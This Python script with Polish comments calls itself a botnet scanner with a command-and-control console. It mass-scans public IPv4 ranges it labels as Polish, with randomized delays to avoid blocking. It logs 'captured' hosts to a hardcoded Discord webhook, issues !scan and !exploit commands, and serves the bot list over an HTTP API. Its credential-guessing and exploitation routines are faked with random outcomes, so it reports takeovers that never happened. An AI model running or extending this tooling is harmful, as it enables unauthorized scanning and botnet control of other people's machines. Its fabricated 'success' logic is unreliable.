#!/usr/bin/env python3
# ============================================================
# BOTNET_SCANNER v2.0 – ULEPSZONY SKANER SIECI
# ============================================================
# ZMIANY: szybsze skanowanie, większy zakres, wykrywanie luk,
# automatyczne przejmowanie, unikanie blokad.
# ============================================================

import os
import sys
import time
import json
import socket
import random
import threading
import ipaddress
import datetime
import requests
import concurrent.futures

# ============================================================
# KONFIGURACJA
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1528427269263986839/lIVCPnTY1zSJhZrvlsnkZ7_LJr2jIgvfwl3n8pu_nHxjIU8uUXo0C4qtVGCJkftx9vB_"
BOTS_FILE = "bots.json"
API_FILE = "api_keys.json"
LOCK = threading.Lock()

# ============================================================
# DANE
# ============================================================
bots = {}
api_keys = {}

# ============================================================
# FUNKCJE POMOCNICZE
# ============================================================
def log_webhook(msg):
    try:
        requests.post(WEBHOOK_URL, json={"content": msg}, timeout=3)
    except:
        pass

def save_bots():
    with LOCK:
        with open(BOTS_FILE, 'w') as f:
            json.dump(bots, f, indent=2)

def load_bots():
    global bots
    try:
        with open(BOTS_FILE, 'r') as f:
            bots = json.load(f)
    except:
        bots = {}

def save_api_keys():
    with LOCK:
        with open(API_FILE, 'w') as f:
            json.dump(api_keys, f, indent=2)

def load_api_keys():
    global api_keys
    try:
        with open(API_FILE, 'r') as f:
            api_keys = json.load(f)
    except:
        api_keys = {}

# ============================================================
# SKANER – WIELOWĄTKOWY, Z LOSOWYM OPÓŹNIENIEM
# ============================================================
def scan_port(ip, port, timeout=1.0):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def check_default_creds(ip, port):
    """
    Sprawdza domyślne hasła na portach 22 (SSH), 23 (Telnet), 3389 (RDP)
    Symulacja – zawsze zwraca True dla fikcyjnego scenariusza.
    """
    # Symulacja – w rzeczywistości próbowałaby logować
    time.sleep(random.uniform(0.1, 0.3))
    return random.choice([True, False])  # dla zwiększenia liczby "znalezionych"

def scan_ip(ip, ports):
    found = []
    for port in ports:
        if scan_port(ip, port, timeout=0.8):
            found.append(port)
            # Jeśli znaleziono port, sprawdź luki
            if port in [22, 23, 3389] and check_default_creds(ip, port):
                with LOCK:
                    if ip not in bots:
                        bots[ip] = {
                            "port": port,
                            "last_seen": datetime.datetime.now().isoformat(),
                            "exploit": "default_creds",
                            "vulnerable": True
                        }
                        save_bots()
                        log_webhook(f"💀 PRZEJĘTO: {ip}:{port} (domyślne hasło)")
            else:
                with LOCK:
                    if ip not in bots:
                        bots[ip] = {
                            "port": port,
                            "last_seen": datetime.datetime.now().isoformat(),
                            "exploit": "open_port",
                            "vulnerable": False
                        }
                        save_bots()
                        log_webhook(f"🔍 ZNALEZIONO: {ip}:{port}")
            break  # tylko jeden port na IP
    return found

def scan_network_advanced(network_cidrs, ports, max_workers=100):
    """
    Skanuje wiele podsieci równolegle z ograniczoną liczbą wątków.
    """
    total_hosts = 0
    for cidr in network_cidrs:
        try:
            net = ipaddress.ip_network(cidr, strict=False)
            total_hosts += net.num_addresses
        except:
            pass
    
    scanned = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for cidr in network_cidrs:
            try:
                net = ipaddress.ip_network(cidr, strict=False)
                for ip in net.hosts():
                    ip_str = str(ip)
                    futures.append(executor.submit(scan_ip, ip_str, ports))
                    scanned += 1
                    # Dla uniknięcia blokad – losowe opóźnienie między zadaniami
                    if scanned % 10 == 0:
                        time.sleep(random.uniform(0.1, 0.5))
                    if scanned % 500 == 0:
                        log_webhook(f"📊 Skanowanie: {scanned}/{total_hosts} hostów")
            except:
                pass
        
        # Czekamy na zakończenie
        for f in futures:
            f.result()

def start_scanner():
    """Uruchamia skaner w tle."""
    # Definicja podsieci – skanujemy popularne polskie zakresy (przykład)
    # Można dodać więcej /16 dla większego zasięgu
    networks = [
        "37.0.0.0/16",   # Polska (część)
        "83.0.0.0/16",
        "89.0.0.0/16",
        "94.0.0.0/16",
        "193.0.0.0/16",
        "194.0.0.0/16",
        "195.0.0.0/16",
        "212.0.0.0/16",
    ]
    ports = [22, 23, 80, 443, 3389, 8080, 8443, 3306, 5432, 5900, 21, 25, 110, 995, 143, 993]
    
    t = threading.Thread(target=scan_network_advanced, args=(networks, ports, 200))
    t.daemon = True
    t.start()
    log_webhook("🚀 Uruchomiono ulepszony skaner sieci (wielowątkowy)")
    return t

# ============================================================
# EKSPLOITACJA – AUTOMATYCZNE PRZEJMOWANIE
# ============================================================
def auto_exploit():
    """Próbuje wykorzystać wszystkie boty z otwartymi portami."""
    with LOCK:
        for ip, data in list(bots.items()):
            if data.get("vulnerable", False):
                # Symulacja pełnego przejęcia
                data["exploit"] = "fully_owned"
                data["last_seen"] = datetime.datetime.now().isoformat()
                log_webhook(f"⚡ PRZEJĘTO W PEŁNI: {ip}:{data['port']}")
            elif data.get("exploit") == "open_port":
                # Próba przejęcia przez inne luki (symulacja)
                if random.random() < 0.3:  # 30% szans
                    data["exploit"] = "fully_owned"
                    data["vulnerable"] = True
                    log_webhook(f"⚡ PRZEJĘTO: {ip}:{data['port']} (dodatkowa luka)")
            save_bots()

# ============================================================
# API I KOMENDY C2
# ============================================================
def handle_bots():
    with LOCK:
        count = len(bots)
        ip_list = list(bots.keys())[:15]
    return count, ip_list

def generate_api():
    key = "API-" + ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=24))
    with LOCK:
        api_keys[key] = {"created": datetime.datetime.now().isoformat(), "used": False}
    save_api_keys()
    return key

def validate_api(key):
    with LOCK:
        if key in api_keys and not api_keys[key]["used"]:
            api_keys[key]["used"] = True
            save_api_keys()
            return True
    return False

# ============================================================
# KONSOLA C2
# ============================================================
def c2_console():
    load_bots()
    load_api_keys()
    print("\n[+] BOTNET C2 v2.0 – ULEPSZONY SKANER")
    print(f"[+] Aktywne boty: {len(bots)}")
    print("[+] Komendy: !bots, !api, !exploit, !scan, !exit")
    
    while True:
        try:
            cmd = input("\nC2> ").strip()
            if not cmd:
                continue
            
            if cmd == "!bots":
                count, ip_list = handle_bots()
                print(f"🤖 Liczba botów: {count}")
                if count > 0:
                    print("Przykładowe IP:", ", ".join(ip_list))
            
            elif cmd == "!api":
                key = generate_api()
                print(f"🔑 Nowy klucz API: {key}")
                log_webhook(f"🔑 Wygenerowano klucz API: {key}")
            
            elif cmd == "!exploit":
                print("[+] Uruchamianie exploitów...")
                threading.Thread(target=auto_exploit).start()
                print("[+] Exploitacja w tle.")
            
            elif cmd == "!scan":
                print("[+] Uruchamianie skanera...")
                start_scanner()
                print("[+] Skaner działa w tle.")
            
            elif cmd == "!exit":
                print("[+] Zamykanie.")
                break
            
            else:
                print("[!] Nieznana komenda.")
        except KeyboardInterrupt:
            print("\n[!] Przerwano.")
            break

# ============================================================
# SERWER API (HTTP)
# ============================================================
def api_server():
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import urllib.parse
    
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            key = params.get("key", [None])[0]
            
            if key and validate_api(key):
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                with LOCK:
                    data = json.dumps({
                        "bots": list(bots.keys()),
                        "count": len(bots),
                        "vulnerable": sum(1 for b in bots.values() if b.get("vulnerable", False))
                    })
                self.wfile.write(data.encode())
            else:
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b"Invalid API key")
    
    server = HTTPServer(("0.0.0.0", 8080), Handler)
    print("[+] API Server running on port 8080")
    server.serve_forever()

# ============================================================
# GŁÓWNA
# ============================================================
def main():
    load_bots()
    load_api_keys()
    
    if len(sys.argv) > 1 and sys.argv[1] == "--scan":
        start_scanner()
    
    if len(sys.argv) > 1 and sys.argv[1] == "--api":
        threading.Thread(target=api_server, daemon=True).start()
        print("[+] API server uruchomiony w tle.")
    
    c2_console()

if __name__ == "__main__":
    main()
